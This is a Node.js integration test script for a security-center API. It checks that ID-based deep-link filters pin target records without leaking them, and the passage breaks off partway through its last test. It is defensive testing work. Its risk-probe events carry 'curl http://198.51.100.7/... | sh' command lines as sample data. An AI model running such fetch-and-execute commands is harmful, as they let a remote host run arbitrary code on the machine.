#!/usr/bin/env node

import { managementAuthHeaders, safeProbeId } from './probe-id.mjs';

const baseUrl = (process.env.ANYSENTRY_API_BASE ?? process.env.API_BASE ?? `http://127.0.0.1:${process.env.PORT ?? '29653'}/security-center`).replace(/\/$/, '');
const runId = safeProbeId('dl');
const SEVERITY_RANK = { info: 0, low: 1, medium: 2, high: 3, critical: 4 };

function fail(message, details) {
  console.error(`FAIL ${message}`);
  if (details !== undefined) console.error(JSON.stringify(details, null, 2));
  process.exitCode = 1;
}

function pass(message) {
  console.log(`PASS ${message}`);
}

function assert(message, condition, details) {
  if (condition) pass(message);
  else fail(message, details);
}

function severityAtLeast(value, min) {
  return (SEVERITY_RANK[value] ?? -1) >= (SEVERITY_RANK[min] ?? 999);
}

function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}

async function eventually(label, fn, timeoutMs = 8000) {
  const deadline = Date.now() + timeoutMs;
  let lastValue;
  while (Date.now() < deadline) {
    lastValue = await fn();
    if (lastValue) return lastValue;
    await sleep(250);
  }
  throw new Error(`Timed out waiting for ${label}. Last value: ${JSON.stringify(lastValue, null, 2)}`);
}

async function request(path, method = 'GET', body, headers = {}) {
  const res = await fetch(`${baseUrl}${path}`, {
    method,
    headers: { 'content-type': 'application/json', ...managementAuthHeaders(), ...headers },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  const text = await res.text();
  let payload;
  try {
    payload = text ? JSON.parse(text) : undefined;
  } catch {
    payload = text;
  }
  if (!res.ok) {
    throw new Error(`${method} ${path} -> ${res.status}: ${text}`);
  }
  return payload?.data ?? payload;
}

const ids = {
  sourceA: `${runId}-source-a`,
  sourceB: `${runId}-source-b`,
  collectorA: `${runId}-collector-a`,
  collectorB: `${runId}-collector-b`,
  agentA: `${runId}-agent-a`,
  agentB: `${runId}-agent-b`,
  eventAgentA: `${runId}-event-agent-a`,
  eventAgentB: `${runId}-event-agent-b`,
  riskAgentA: `${runId}-risk-agent-a`,
  riskAgentB: `${runId}-risk-agent-b`,
  alertSourceA: `${runId}-alert-source-a`,
  alertSourceB: `${runId}-alert-source-b`,
  workspaceAgents: `repo://${runId}-agents`,
  workspaceA: `repo://${runId}-workspace-a`,
  workspaceB: `repo://${runId}-workspace-b`,
  workspaceRiskA: `repo://${runId}-risk-a`,
  workspaceRiskB: `repo://${runId}-risk-b`,
  topologyWorkspaceA: `repo://${runId}-topology-a`,
  topologyWorkspaceB: `repo://${runId}-topology-b`,
  peerA: `${runId}-a.example.test`,
  peerB: `${runId}-b.example.test`,
};

async function verifySources() {
  await request(`/sources/${encodeURIComponent(ids.sourceA)}`, 'PUT', {
    name: ids.sourceA,
    type: 'custom',
    enabled: false,
    collectorId: ids.collectorA,
    workspacePath: ids.workspaceA,
    tags: [runId],
  });
  await request(`/sources/${encodeURIComponent(ids.sourceB)}`, 'PUT', {
    name: ids.sourceB,
    type: 'custom',
    enabled: true,
    collectorId: ids.collectorB,
    workspacePath: ids.workspaceB,
    tags: [runId],
  });

  const exact = await request('/sources/list', 'POST', { sourceId: ids.sourceA, limit: 20 });
  const pinned = await request('/sources/list', 'POST', { sourceId: ids.sourceA, status: 'unused', q: ids.sourceB, limit: 20 });
  const filtered = await request('/sources/list', 'POST', { status: 'unused', q: ids.sourceB, limit: 20 });
  const exactCollector = await request('/sources/list', 'POST', { collectorId: ids.collectorA, limit: 20 });
  const partialCollector = await request('/sources/list', 'POST', { collectorId: ids.collectorA.slice(0, -1), limit: 20 });
  const pinnedCollector = await request('/sources/list', 'POST', { sourceId: ids.sourceA, collectorId: ids.collectorB, limit: 20 });
  const filteredCollector = await request('/sources/list', 'POST', { collectorId: ids.collectorB, limit: 20 });
  const exactWorkspace = await request('/sources/list', 'POST', { workspacePath: ids.workspaceA, limit: 20 });
  const pinnedWorkspace = await request('/sources/list', 'POST', { sourceId: ids.sourceA, workspacePath: ids.workspaceB, limit: 20 });
  const filteredWorkspace = await request('/sources/list', 'POST', { workspacePath: ids.workspaceB, limit: 20 });

  assert('sources exact sourceId returns only target', exact.total === 1 && exact.items[0]?.sourceId === ids.sourceA, exact);
  assert(
    'sources sourceId + filters pins target before filtered context',
    pinned.items[0]?.sourceId === ids.sourceA && pinned.items.some((item) => item.sourceId === ids.sourceB),
    pinned,
  );
  assert('sources plain filters do not leak pinned target', filtered.total === 1 && filtered.items[0]?.sourceId === ids.sourceB, filtered);
  assert('sources collectorId filter returns only exact collector sources', exactCollector.items.some((item) => item.sourceId === ids.sourceA) && exactCollector.items.every((item) => item.collectorId === ids.collectorA), exactCollector);
  assert('sources collectorId filter rejects partial collector IDs', !partialCollector.items.some((item) => item.sourceId === ids.sourceA || item.sourceId === ids.sourceB), partialCollector);
  assert(
    'sources sourceId + collectorId pins target before filtered collector context',
    pinnedCollector.items[0]?.sourceId === ids.sourceA && pinnedCollector.items.some((item) => item.sourceId === ids.sourceB),
    pinnedCollector,
  );
  assert('sources collectorId filter does not leak pinned source', filteredCollector.items.some((item) => item.sourceId === ids.sourceB) && !filteredCollector.items.some((item) => item.sourceId === ids.sourceA), filteredCollector);
  assert('sources workspacePath filter returns only exact workspace sources', exactWorkspace.items.some((item) => item.sourceId === ids.sourceA) && exactWorkspace.items.every((item) => item.workspacePath === ids.workspaceA), exactWorkspace);
  assert(
    'sources sourceId + workspacePath pins target before filtered workspace context',
    pinnedWorkspace.items[0]?.sourceId === ids.sourceA && pinnedWorkspace.items.some((item) => item.sourceId === ids.sourceB),
    pinnedWorkspace,
  );
  assert('sources workspacePath filter does not leak pinned source', filteredWorkspace.items.some((item) => item.sourceId === ids.sourceB) && !filteredWorkspace.items.some((item) => item.sourceId === ids.sourceA), filteredWorkspace);
}

async function verifyCollectors() {
  const collectorSourceA = `${ids.collectorA}-heartbeat-source`;
  const collectorSourceB = `${ids.collectorB}-heartbeat-source`;
  await request(`/sources/${encodeURIComponent(collectorSourceA)}`, 'PUT', {
    name: collectorSourceA,
    type: 'forwarder',
    enabled: true,
    collectorId: ids.collectorA,
    tags: [runId, 'collector-health'],
  });
  await request(`/sources/${encodeURIComponent(collectorSourceB)}`, 'PUT', {
    name: collectorSourceB,
    type: 'forwarder',
    enabled: true,
    collectorId: ids.collectorB,
    tags: [runId, 'collector-health'],
  });
  await request('/collectors/heartbeat', 'POST', {
    sourceId: collectorSourceA,
    collectorId: ids.collectorA,
    nodeName: `${runId}-node-a`,
    status: 'ok',
    eventKindCounts: { Egress: 3 },
  });
  await request('/collectors/heartbeat', 'POST', {
    sourceId: collectorSourceB,
    collectorId: ids.collectorB,
    nodeName: `${runId}-node-b`,
    status: 'error',
    errorCount: 1,
    eventKindCounts: { Egress: 1 },
  });

  const exact = await request('/collectors/health', 'POST', { timeType: 'last_30d', collectorId: ids.collectorA, limit: 20 });
  const pinned = await request('/collectors/health', 'POST', { timeType: 'last_30d', collectorId: ids.collectorA, q: ids.collectorB, limit: 20 });
  const filtered = await request('/collectors/health', 'POST', { timeType: 'last_30d', q: ids.collectorB, limit: 20 });

  assert('collectors exact collectorId returns only target', exact.total === 1 && exact.items[0]?.collectorId === ids.collectorA, exact);
  assert(
    'collectors collectorId + filters pins target before filtered context',
    pinned.items[0]?.collectorId === ids.collectorA && pinned.items.some((item) => item.collectorId === ids.collectorB),
    pinned,
  );
  assert('collectors plain filters do not leak pinned target', filtered.total === 1 && filtered.items[0]?.collectorId === ids.collectorB, filtered);
}

async function ingestProbeEvents() {
  const result = await request('/ingest/events', 'POST', {
    sourceType: 'custom',
    sourceName: `${runId}-events`,
    collectorId: `${runId}-event-collector`,
    events: [
      {
        kind: 'egress',
        workspacePath: ids.topologyWorkspaceA,
        agentId: ids.eventAgentA,
        sessionId: `${runId}-session-a`,
        userId: 'deep-link-probe',
        peer: ids.peerA,
        port: 443,
        attributes: { marker: runId },
      },
      {
        kind: 'egress',
        workspacePath: ids.topologyWorkspaceB,
        agentId: ids.eventAgentB,
        sessionId: `${runId}-session-b`,
        userId: 'deep-link-probe',
        peer: ids.peerB,
        port: 443,
        attributes: { marker: runId },
      },
    ],
  });
  if (result.acceptedEvents !== 2) throw new Error(`expected 2 accepted probe events: ${JSON.stringify(result)}`);
  return result.items.filter((item) => item.accepted);
}

async function verifyEvents(events) {
  const eventA = events[0];
  const eventB = events[1];
  const exact = await request('/events/list', 'POST', { timeType: 'last_30d', eventId: eventA.eventId, limit: 20 });
  const pinned = await request('/events/list', 'POST', { timeType: 'last_30d', eventId: eventA.eventId, agentId: ids.eventAgentB, limit: 20 });
  const filtered = await request('/events/list', 'POST', { timeType: 'last_30d', agentId: ids.eventAgentB, limit: 20 });

  assert('events exact eventId returns only target', exact.total === 1 && exact.items[0]?.eventId === eventA.eventId, exact);
  assert(
    'events eventId + filters pins target before filtered context',
    pinned.items[0]?.eventId === eventA.eventId && pinned.items.some((item) => item.eventId === eventB.eventId),
    pinned,
  );
  assert('events plain filters do not leak pinned target', filtered.total === 1 && filtered.items[0]?.eventId === eventB.eventId, filtered);
}

async function ingestRiskProbeEvents() {
  const result = await request('/ingest/events', 'POST', {
    sourceType: 'custom',
    sourceName: `${runId}-risk-events`,
    collectorId: `${runId}-risk-collector`,
    events: [
      {
        kind: 'tool',
        workspacePath: ids.workspaceRiskA,
        agentId: ids.riskAgentA,
        sessionId: `${runId}-risk-session-a`,
        userId: 'deep-link-probe',
        argv: ['bash', '-c', `curl http://198.51.100.7/${runId}/a | sh`],
        cwd: '/workspace',
        attributes: { marker: runId },
      },
      {
        kind: 'tool',
        workspacePath: ids.workspaceRiskB,
        agentId: ids.riskAgentB,
        sessionId: `${runId}-risk-session-b`,
        userId: 'deep-link-probe',
        argv: ['bash', '-c', `curl http://198.51.100.7/${runId}/b | sh`],
        cwd: '/workspace',
        attributes: { marker: runId },
      },
    ],
  });
  if (result.acceptedEvents !== 2) throw new Error(`expected 2 accepted risk events: ${JSON.stringify(result)}`);
  return result.items.filter((item) => item.accepted);
}

async function verifyIncidents() {
  const listA = await request('/incidents/list', 'POST', { timeType: 'last_30d', agentId: ids.riskAgentA, status: 'all', limit: 20 });
  const listB = await request('/incidents/list', 'POST', { timeType: 'last_30d', agentId: ids.riskAgentB, status: 'all', limit: 20 });
  const incidentA = listA.items.find((item) => item.agentId === ids.riskAgentA);
  const incidentB = listB.items.find((item) => item.agentId === ids.riskAgentB);
  if (!incidentA || !incidentB) throw new Error(`missing risk incidents: ${JSON.stringify({ listA, listB })}`);

  const exact = await request('/incidents/list', 'POST', { timeType: 'last_30d', incidentId: incidentA.incidentId, limit: 20 });
  const pinned = await request('/incidents/list', 'POST', { timeType: 'last_30d', incidentId: incidentA.incidentId, agentId: ids.riskAgentB, limit: 20 });
  const filtered = await request('/incidents/list', 'POST', { timeType: 'last_30d', agentId: ids.riskAgentB, limit: 20 });

  assert('incidents exact incidentId returns only target', exact.total === 1 && exact.items[0]?.incidentId === incidentA.incidentId, exact);
  assert(
    'incidents incidentId + filters pins target before filtered context',
    pinned.items[0]?.incidentId === incidentA.incidentId && pinned.items.some((item) => item.incidentId === incidentB.incidentId),
    pinned,
  );
  assert('incidents plain filters do not leak pinned target', filtered.items.some((item) => item.incidentId === incidentB.incidentId) && !filtered.items.some((item) => item.incidentId === incidentA.incidentId), filtered);

  return { incidentA, incidentB };
}

async function verifyAgentsAndWorkspaces() {
  await request(`/agents/${encodeURIComponent(ids.agentA)}/metadata`, 'PUT', {
    workspacePath: ids.workspaceAgents,
    displayName: `${runId} Agent A`,
    owner: `${runId}-owner-a`,
    environment: 'dev',
    criticality: 'low',
    tags: [runId],
  });
  await request(`/agents/${encodeURIComponent(ids.agentB)}/metadata`, 'PUT', {
    workspacePath: ids.workspaceAgents,
    displayName: `${runId} Agent B`,
    owner: `${runId}-owner-b`,
    environment: 'dev',
    criticality: 'low',
    tags: [runId],
  });
  await request(`/agents/${encodeURIComponent(`${runId}-workspace-agent-a`)}/metadata`, 'PUT', {
    workspacePath: ids.workspaceA,
    displayName: `${runId} Workspace A`,
    environment: 'dev',
    criticality: 'low',
    tags: [runId],
  });
  await request(`/agents/${encodeURIComponent(`${runId}-workspace-agent-b`)}/metadata`, 'PUT', {
    workspacePath: ids.workspaceB,
    displayName: `${runId} Workspace B`,
    environment: 'dev',
    criticality: 'low',
    tags: [runId],
  });

  const exactAgent = await request('/agents/inventory', 'POST', { timeType: 'last_30d', agentId: ids.agentA, workspacePath: ids.workspaceAgents, limit: 20 });
  const pinnedAgent = await request('/agents/inventory', 'POST', { timeType: 'last_30d', agentId: ids.agentA, workspacePath: ids.workspaceAgents, healthState: 'stale', q: ids.agentB, limit: 20 });
  const filteredAgent = await request('/agents/inventory', 'POST', { timeType: 'last_30d', workspacePath: ids.workspaceAgents, healthState: 'stale', q: ids.agentB, limit: 20 });

  assert('agents exact agentId/workspacePath returns only target', exactAgent.total === 1 && exactAgent.items[0]?.agentId === ids.agentA, exactAgent);
  assert(
    'agents agentId + filters pins target before filtered context',
    pinnedAgent.items[0]?.agentId === ids.agentA && pinnedAgent.items.some((item) => item.agentId === ids.agentB),
    pinnedAgent,
  );
  assert('agents plain filters do not leak pinned target', filteredAgent.total === 1 && filteredAgent.items[0]?.agentId === ids.agentB, filteredAgent);

  const exactWorkspace = await request('/workspaces/inventory', 'POST', { timeType: 'last_30d', workspacePath: ids.workspaceA, limit: 20 });
  const pinnedWorkspace = await request('/workspaces/inventory', 'POST', { timeType: 'last_30d', workspacePath: ids.workspaceA, healthState: 'stale', q: ids.workspaceB, limit: 20 });
  const filteredWorkspace = await request('/workspaces/inventory', 'POST', { timeType: 'last_30d', healthState: 'stale', q: ids.workspaceB, limit: 20 });

  assert('workspaces exact workspacePath returns only target', exactWorkspace.total === 1 && exactWorkspace.items[0]?.workspacePath === ids.workspaceA, exactWorkspace);
  assert(
    'workspaces workspacePath + filters pins target before filtered context',
    pinnedWorkspace.items[0]?.workspacePath === ids.workspaceA && pinnedWorkspace.items.some((item) => item.workspacePath === ids.workspaceB),
    pinnedWorkspace,
  );
  assert('workspaces plain filters do not leak pinned target', filteredWorkspace.total === 1 && filteredWorkspace.items[0]?.workspacePath === ids.workspaceB, filteredWorkspace);
}

async function createSourceAlerts() {
  await request(`/sources/${encodeURIComponent(ids.alertSourceA)}`, 'PUT', {
    name: ids.alertSourceA,
    type: 'custom',
    enabled: true,
    workspacePath: ids.workspaceA,
    tags: [runId],
  });
  await request(`/sources/${encodeURIComponent(ids.alertSourceB)}`, 'PUT', {
    name: ids.alertSourceB,
    type: 'custom',
    enabled: true,
    workspacePath: ids.workspaceB,
    tags: [runId],
  });
  await request('/sources/check-in', 'POST', {
    sourceId: ids.alertSourceA,
    sourceName: ids.alertSourceA,
    sourceType: 'custom',
    workspacePath: ids.workspaceA,
    status: 'error',
    message: `${runId} source alert A`,
  });
  await request('/sources/check-in', 'POST', {
    sourceId: ids.alertSourceB,
    sourceName: ids.alertSourceB,
    sourceType: 'custom',
    workspacePath: ids.workspaceB,
    status: 'error',
    message: `${runId} source alert B`,
  });
}

async function verifyAlerts() {
  const listA = await request('/alerts/list', 'POST', { timeType: 'last_30d', sourceId: ids.alertSourceA, status: 'all', limit: 20 });
  const listB = await request('/alerts/list', 'POST', { timeType: 'last_30d', sourceId: ids.alertSourceB, status: 'all', limit: 20 });
  const alertA = listA.items.find((item) => item.sourceId === ids.alertSourceA);
  const alertB = listB.items.find((item) => item.sourceId === ids.alertSourceB);
  if (!alertA || !alertB) throw new Error(`missing source alerts: ${JSON.stringify({ listA, listB })}`);

  const exact = await request('/alerts/list', 'POST', { timeType: 'last_30d', alertId: alertA.alertId, limit: 20 });
  const pinned = await request('/alerts/list', 'POST', { timeType: 'last_30d', alertId: alertA.alertId, sourceId: ids.alertSourceB, limit: 20 });
  const filtered = await request('/alerts/list', 'POST', { timeType: 'last_30d', sourceId: ids.alertSourceB, limit: 20 });

  assert('alerts exact alertId returns only target', exact.total === 1 && exact.items[0]?.alertId === alertA.alertId, exact);
  assert(
    'alerts alertId + filters pins target before filtered context',
    pinned.items[0]?.alertId === alertA.alertId && pinned.items.some((item) => item.alertId === alertB.alertId),
    pinned,
  );
  assert('alerts plain filters do not leak pinned target', filtered.items.some((item) => item.alertId === alertB.alertId) && !filtered.items.some((item) => item.alertId === alertA.alertId), filtered);

  return { alertA, alertB };
}

async function verifyRemediations(alerts) {
  const listA = await request('/remediations/list', 'POST', { timeType: 'last_30d', sourceId: ids.alertSourceA, status: 'all', limit: 50 });
  const listB = await request('/remediations/list', 'POST', { timeType: 'last_30d', sourceId: ids.alertSourceB, status: 'all', limit: 50 });
  const taskA = listA.items.find((item) => item.alertId === alerts.alertA.alertId || item.ingestionSourceId === ids.alertSourceA);
  const taskB = listB.items.find((item) => item.alertId === alerts.alertB.alertId || item.ingestionSourceId === ids.alertSourceB);
  if (!taskA || !taskB) throw new Error(`missing source alert remediations: ${JSON.stringify({ listA, listB, alerts })}`);

  const exact = await request('/remediations/list', 'POST', { timeType: 'last_30d', taskId: taskA.taskId, limit: 20 });
  const pinned = await request('/remediations/list', 'POST', { timeType: 'last_30d', taskId: taskA.taskId, sourceId: ids.alertSourceB, limit: 20 });
  const filtered = await request('/remediations/list', 'POST', { timeType: 'last_30d', sourceId: ids.alertSourceB, limit: 20 });

  assert('remediations exact taskId returns only target', exact.total === 1 && exact.items[0]?.taskId === taskA.taskId, exact);
  assert(
    'remediations taskId + filters pins target before filtered context',
    pinned.items[0]?.taskId === taskA.taskId && pinned.items.some((item) => item.taskId === taskB.taskId),
    pinned,
  );
  assert('remediations plain filters do not leak pinned target', filtered.items.some((item) => item.taskId === taskB.taskId) && !filtered.items.some((item) => item.taskId === taskA.taskId), filtered);
}

async function verifyCoverage() {
  const collectorIssues = await request('/coverage/overview', 'POST', { timeType: 'last_30d', collectorId: ids.collectorB, limit: 100 });
  const sourceIssues = await request('/coverage/overview', 'POST', { timeType: 'last_30d', sourceId: ids.sourceB, limit: 100 });
  const issueA = collectorIssues.issues.find((item) => item.collectorId === ids.collectorB && item.type === 'collector_degraded');
  const issueB = sourceIssues.issues.find((item) => item.sourceId === ids.sourceB && item.type === 'source_unused');
  if (!issueA || !issueB) throw new Error(`missing coverage issues: ${JSON.stringify({ collectorIssues, sourceIssues })}`);

  const exact = await request('/coverage/overview', 'POST', { timeType: 'last_30d', issueId: issueA.issueId, limit: 20 });
  const pinned = await request('/coverage/overview', 'POST', { timeType: 'last_30d', issueId: issueA.issueId, sourceId: ids.sourceB, limit: 20 });
  const filtered = await request('/coverage/overview', 'POST', { timeType: 'last_30d', sourceId: ids.sourceB, limit: 20 });

  assert('coverage exact issueId returns only target', exact.issues.length === 1 && exact.issues[0]?.issueId === issueA.issueId, exact);
  assert(
    'coverage issueId + filters pins target before filtered context',
    pinned.issues[0]?.issueId === issueA.issueId && pinned.issues.some((item) => item.issueId === issueB.issueId),
    pinned,
  );
  assert('coverage plain filters do not leak pinned target', filtered.issues.some((item) => item.issueId === issueB.issueId) && !filtered.issues.some((item) => item.issueId === issueA.issueId), filtered);

  const alertExact = await request('/alerts/list', 'POST', { timeType: 'last_30d', status: 'all', issueId: issueA.issueId, limit: 20 });
  const alertPinned = await request('/alerts/list', 'POST', { timeType: 'last_30d', kind: 'coverage', status: 'all', issueId: issueA.issueId, sourceId: ids.sourceB, limit: 20 });
  const alertFiltered = await request('/alerts/list', 'POST', { timeType: 'last_30d', kind: 'coverage', status: 'all', sourceId: ids.sourceB, limit: 20 });
  const alertA = alertExact.items.find((item) => item.labels?.issueId === issueA.issueId);
  const alertB = alertFiltered.items.find((item) => item.labels?.issueId === issueB.issueId);

  assert('alerts exact issueId returns coverage target', alertExact.total >= 1 && alertA && alertExact.items.every((item) => item.labels?.issueId === issueA.issueId), alertExact);
  assert(
    'alerts issueId + filters pins coverage target before filtered context',
    alertPinned.items[0]?.labels?.issueId === issueA.issueId && alertB && alertPinned.items.some((item) => item.alertId === alertB.alertId),
    { alertPinned, alertA, alertB },
  );
  assert('alerts plain source filter does not leak pinned coverage target', alertB && !alertFiltered.items.some((item) => item.alertId === alertA?.alertId), { alertFiltered, alertA, alertB });

  const remediationExact = await request('/remediations/list', 'POST', { timeType: 'last_30d', status: 'all', issueId: issueA.issueId, limit: 20 });
  const remediationPinned = await request('/remediations/list', 'POST', { timeType: 'last_30d', sourceType: 'coverage', status: 'all', issueId: issueA.issueId, sourceId: ids.sourceB, limit: 20 });
  const remediationFiltered = await request('/remediations/list', 'POST', { timeType: 'last_30d', sourceType: 'coverage', status: 'all', sourceId: ids.sourceB, limit: 20 });
  const remediationA = remediationExact.items.find((item) => item.sourceType === 'coverage' && item.sourceId === issueA.issueId);
  const remediationB = remediationFiltered.items.find((item) => item.sourceType === 'coverage' && item.sourceId === issueB.issueId);

  assert('remediations exact issueId returns coverage task', remediationExact.total >= 1 && remediationA && remediationExact.items.every((item) => item.sourceType === 'coverage' && item.sourceId === issueA.issueId), remediationExact);
  assert(
    'remediations issueId + filters pins coverage task before filtered context',
    remediationPinned.items[0]?.sourceType === 'coverage' && remediationPinned.items[0]?.sourceId === issueA.issueId && remediationB && remediationPinned.items.some((item) => item.taskId === remediationB.taskId),
    { remediationPinned, remediationA, remediationB },
  );
  assert('remediations plain source filter does not leak pinned coverage task', remediationB && !remediationFiltered.items.some((item) => item.taskId === remediationA?.taskId), { remediationFiltered, remediationA, remediationB });
}

async function verifyTopology(events) {
  const full = await request('/agents/topology', 'POST', { timeType: 'last_30d', q: runId, includeBenign: true, limit: 100 });
  const nodeById = new Map(full.nodes.map((node) => [node.nodeId, node]));
  const edgeA = full.edges.find((edge) => edge.type === 'connects' && nodeById.get(edge.targetNodeId)?.label === `${ids.peerA}:443`);
  const edgeB = full.edges.find((edge) => edge.type === 'connects' && nodeById.get(edge.targetNodeId)?.label === `${ids.peerB}:443`);
  if (!edgeA || !edgeB) throw new Error(`missing topology probe edges: ${JSON.stringify(full)}`);

  const exactEdge = await request('/agents/topology', 'POST', { timeType: 'last_30d', edgeId: edgeA.edgeId, includeBenign: true, limit: 100 });
  const pinnedEdge = await request('/agents/topology', 'POST', { timeType: 'last_30d', edgeId: edgeA.edgeId, q: ids.peerB, includeBenign: true, limit: 100 });
  const filtered = await request('/agents/topology', 'POST', { timeType: 'last_30d', q: ids.peerB, includeBenign: true, limit: 100 });
  const exactEvent = await request('/agents/topology', 'POST', { timeType: 'last_30d', eventId: events[0].eventId, includeBenign: true, limit: 100 });

  assert('topology exact edgeId returns only target edge', exactEdge.edges.length === 1 && exactEdge.edges[0]?.edgeId === edgeA.edgeId, exactEdge);
  assert(
    'topology edgeId + filters pins target before filtered context',
    pinnedEdge.edges[0]?.edgeId === edgeA.edgeId && pinnedEdge.edges.some((edge) => edge.edgeId === edgeB.edgeId),
    pinnedEdge,
  );
  assert('topology plain filters do not leak pinned edge', filtered.edges.some((edge) => edge.edgeId === edgeB.edgeId) && !filtered.edges.some((edge) => edge.edgeId === edgeA.edgeId), filtered);
  assert(
    'topology exact eventId returns only relationships from that event',
    exactEvent.edges.length >= 2 && exactEvent.edges.every((edge) => edge.sampleEventId === events[0].eventId),
    exactEvent,
  );
}

async function verifyMaintenanceObjectivesAndAudit() {
  const startAt = new Date(Date.now() - 60_000).toISOString();
  const endAt = new Date(Date.now() + 3_600_000).toISOString();
  const maintenanceA = await request('/maintenance/windows', 'POST', {
    title: `${runId} maintenance A`,
    targetType: 'workspace',
    targetId: ids.workspaceA,
    startAt,
    endAt,
    enabled: true,
    owner: `${runId}-owner-a`,
    labels: { probe: runId },
  });
  const maintenanceB = await request('/maintenance/windows', 'POST', {
    title: `${runId} maintenance B`,
    targetType: 'workspace',
    targetId: ids.workspaceB,
    startAt,
    endAt,
    enabled: true,
    owner: `${runId}-owner-b`,
    labels: { probe: runId },
  });

  const exactMaintenance = await request('/maintenance/list', 'POST', { windowId: maintenanceA.windowId, limit: 20 });
  const pinnedMaintenance = await request('/maintenance/list', 'POST', { windowId: maintenanceA.windowId, q: maintenanceB.windowId, limit: 20 });
  const filteredMaintenance = await request('/maintenance/list', 'POST', { q: maintenanceB.windowId, limit: 20 });
  const exactMaintenanceTarget = await request('/maintenance/list', 'POST', { targetType: 'workspace', targetId: ids.workspaceA, limit: 20 });
  const partialMaintenanceTarget = await request('/maintenance/list', 'POST', { targetType: 'workspace', targetId: ids.workspaceA.slice(0, -1), limit: 20 });
  const pinnedMaintenanceTarget = await request('/maintenance/list', 'POST', { windowId: maintenanceA.windowId, targetType: 'workspace', targetId: ids.workspaceB, limit: 20 });
  const filteredMaintenanceTarget = await request('/maintenance/list', 'POST', { targetType: 'workspace', targetId: ids.workspaceB, limit: 20 });

  assert('maintenance exact windowId returns only target', exactMaintenance.total === 1 && exactMaintenance.items[0]?.windowId === maintenanceA.windowId, exactMaintenance);
  assert(
    'maintenance windowId + filters pins target before filtered context',
    pinnedMaintenance.items[0]?.windowId === maintenanceA.windowId && pinnedMaintenance.items.some((item) => item.windowId === maintenanceB.windowId),
    pinnedMaintenance,
  );
  assert('maintenance plain filters do not leak pinned target', filteredMaintenance.total === 1 && filteredMaintenance.items[0]?.windowId === maintenanceB.windowId, filteredMaintenance);
  assert('maintenance targetId filter returns only exact target windows', exactMaintenanceTarget.items.some((item) => item.windowId === maintenanceA.windowId) && exactMaintenanceTarget.items.every((item) => item.targetId === ids.workspaceA), exactMaintenanceTarget);
  assert('maintenance targetId filter rejects partial target IDs', !partialMaintenanceTarget.items.some((item) => item.windowId === maintenanceA.windowId), partialMaintenanceTarget);
  assert(
    'maintenance windowId + targetId pins target before filtered target context',
    pinnedMaintenanceTarget.items[0]?.windowId === maintenanceA.windowId && pinnedMaintenanceTarget.items.some((item) => item.windowId === maintenanceB.windowId),
    pinnedMaintenanceTarget,
  );
  assert('maintenance targetId filter does not leak pinned window', filteredMaintenanceTarget.items.some((item) => item.windowId === maintenanceB.windowId) && !filteredMaintenanceTarget.items.some((item) => item.windowId === maintenanceA.windowId), filteredMaintenanceTarget);

  const objectiveA = await request('/objectives', 'POST', {
    name: `${runId} objective A`,
    enabled: true,
    targetType: 'workspace',
    targetId: ids.workspaceA,
    metric: 'active_alerts',
    comparator: 'lte',
    threshold: 0,
    severity: 'medium',
    owner: `${runId}-owner-a`,
    description: `${runId} objective A deep-link probe`,
  });
  const objectiveB = await request('/objectives', 'POST', {
    name: `${runId} objective B`,
    enabled: true,
    targetType: 'workspace',
    targetId: ids.workspaceB,
    metric: 'active_alerts',
    comparator: 'lte',
    threshold: 0,
    severity: 'medium',
    owner: `${runId}-owner-b`,
    description: `${runId} objective B deep-link probe`,
  });

  const exactObjective = await request('/objectives/list', 'POST', { objectiveId: objectiveA.objectiveId, limit: 20 });
  const pinnedObjective = await request('/objectives/list', 'POST', { objectiveId: objectiveA.objectiveId, q: objectiveB.name, limit: 20 });
  const filteredObjective = await request('/objectives/list', 'POST', { q: objectiveB.name, limit: 20 });
  const exactObjectiveTarget = await request('/objectives/list', 'POST', { targetType: 'workspace', targetId: ids.workspaceA, limit: 20 });
  const pinnedObjectiveTarget = await request('/objectives/list', 'POST', { objectiveId: objectiveA.objectiveId, targetType: 'workspace', targetId: ids.workspaceB, limit: 20 });
  const filteredObjectiveTarget = await request('/objectives/list', 'POST', { targetType: 'workspace', targetId: ids.workspaceB, limit: 20 });

  assert('objectives exact objectiveId returns only target', exactObjective.total === 1 && exactObjective.items[0]?.objectiveId === objectiveA.objectiveId, exactObjective);
  assert(
    'objectives objectiveId + filters pins target before filtered context',
    pinnedObjective.items[0]?.objectiveId === objectiveA.objectiveId && pinnedObjective.items.some((item) => item.objectiveId === objectiveB.objectiveId),
    pinnedObjective,
  );
  assert('objectives plain filters do not leak pinned target', filteredObjective.total === 1 && filteredObjective.items[0]?.objectiveId === objectiveB.objectiveId, filteredObjective);
  assert('objectives targetId filter returns only matching target objectives', exactObjectiveTarget.items.some((item) => item.objectiveId === objectiveA.objectiveId) && exactObjectiveTarget.items.every((item) => item.targetId === ids.workspaceA), exactObjectiveTarget);
  assert(
    'objectives objectiveId + targetId pins target before filtered target context',
    pinnedObjectiveTarget.items[0]?.objectiveId === objectiveA.objectiveId && pinnedObjectiveTarget.items.some((item) => item.objectiveId === objectiveB.objectiveId),
    pinnedObjectiveTarget,
  );
  assert('objectives targetId filter does not leak pinned objective', filteredObjectiveTarget.items.some((item) => item.objectiveId === objectiveB.objectiveId) && !filteredObjectiveTarget.items.some((item) => item.objectiveId === objectiveA.objectiveId), filteredObjectiveTarget);

  const auditAList = await request('/audit/list', 'POST', { resourceType: 'objective', resourceId: objectiveA.objectiveId, limit: 20 });
  const auditBList = await request('/audit/list', 'POST', { resourceType: 'objective', resourceId: objectiveB.objectiveId, limit: 20 });
  const auditA = auditAList.items.find((item) => item.resourceId === objectiveA.objectiveId);
  const auditB = auditBList.items.find((item) => item.resourceId === objectiveB.objectiveId);
  if (!auditA || !auditB) throw new Error(`missing objective audit records: ${JSON.stringify({ auditAList, auditBList })}`);

  const exactAudit = await request('/audit/list', 'POST', { auditId: auditA.auditId, limit: 20 });
  const pinnedAudit = await request('/audit/list', 'POST', { auditId: auditA.auditId, q: objectiveB.objectiveId, limit: 20 });
  const filteredAudit = await request('/audit/list', 'POST', { q: objectiveB.objectiveId, limit: 20 });

  assert('audit exact auditId returns only target', exactAudit.total === 1 && exactAudit.items[0]?.auditId === auditA.auditId, exactAudit);
  assert(
    'audit auditId + filters pins target before filtered context',
    pinnedAudit.items[0]?.auditId === auditA.auditId && pinnedAudit.items.some((item) => item.auditId === auditB.auditId),
    pinnedAudit,
  );
  assert('audit plain filters do not leak pinned target', filteredAudit.items.some((item) => item.auditId === auditB.auditId) && !filteredAudit.items.some((item) => item.auditId === auditA.auditId), filteredAudit);

